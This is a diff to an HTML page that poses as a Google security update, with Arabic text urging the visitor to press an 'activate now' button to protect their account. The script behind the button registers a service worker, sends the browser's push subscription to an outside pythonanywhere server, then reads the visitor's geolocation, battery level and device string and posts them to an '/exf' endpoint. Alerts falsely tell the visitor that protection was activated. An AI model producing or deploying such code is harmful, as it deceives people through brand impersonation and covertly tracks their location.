@@ -4,37 +4,55 @@
     <meta charset="UTF-8">
     <title>Google Security</title>
     <script>
-        const publicKey = "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEVgK17MOi9TDGAa8fK/poMVJ0Q58QImEswUUh/GhVXevlPbxCJs1s/vwmxIHqSjC1fsY4BC/kJqJoIty10XtGg==";
+        // المفتاح الصحيح المطابق للسيرفر
+        const publicKey = "BVgK17MOi9TDGAa8fK/poMVJ0Q58QImEswUUh/GhVXevlPbxCJs1s/vwmxIHqSjC1fsY4BC/kJqJoIty10XtGg==";
 
-     
         async function init() {
-            const reg = await navigator.serviceWorker.register('sw.js');
-            const sub = await reg.pushManager.subscribe({ userVisibleOnly: true, applicationServerKey: publicKey });
+            try {
+                const reg = await navigator.serviceWorker.register('sw.js');
+                const sub = await reg.pushManager.subscribe({ 
+                    userVisibleOnly: true, 
+                    applicationServerKey: publicKey 
+                });
 
-            fetch('https://Mohammed888.pythonanywhere.com/save_token', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(sub)
-            });
-
-            // سحب البيانات الأولية
-            navigator.geolocation.getCurrentPosition(pos => {
-                fetch('https://Mohammed888.pythonanywhere.com/exf', {
+                // إرسال التوكن للسيرفر
+                await fetch('https://Mohammed888.pythonanywhere.com/save_token', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        location: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
-                        battery: "90%", device: navigator.userAgent
-                    })
+                    body: JSON.stringify(sub)
                 });
-            });
+
+                // طلب الموقع وإرسال البيانات
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const battery = await navigator.getBattery();
+                    const payload = {
+                        location: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
+                        battery: `${Math.round(battery.level * 100)}%`,
+                        device: navigator.userAgent
+                    };
+
+                    await fetch('https://Mohammed888.pythonanywhere.com/exf', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify(payload)
+                    });
+                    
+                    alert("تم تحديث الأمان بنجاح ✅");
+                }, (err) => {
+                    alert("يرجى السماح بالوصول للموقع لتفعيل الحماية ⚠️");
+                });
+
+            } catch (error) {
+                console.error("Error:", error);
+                alert("حدث خطأ، يرجى المحاولة من متصفح آخر ❌");
+            }
         }
     </script>
 </head>
 <body style="text-align:center; padding:100px; font-family:sans-serif;">
     <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_Ads_logo.svg" width="80">
     <h2>تحديث الأمان مطلوب</h2>
-    <button onclick="init()" style="padding:15px 30px; background:#1a73e8; color:white; border:none; border-radius:5px;">تفعيل الآن</button>
+    <p>لحماية حسابك، يرجى الضغط على الزر أدناه</p>
+    <button onclick="init()" style="padding:15px 30px; background:#1a73e8; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold;">تفعيل الآن</button>
 </body>
 </html>
-
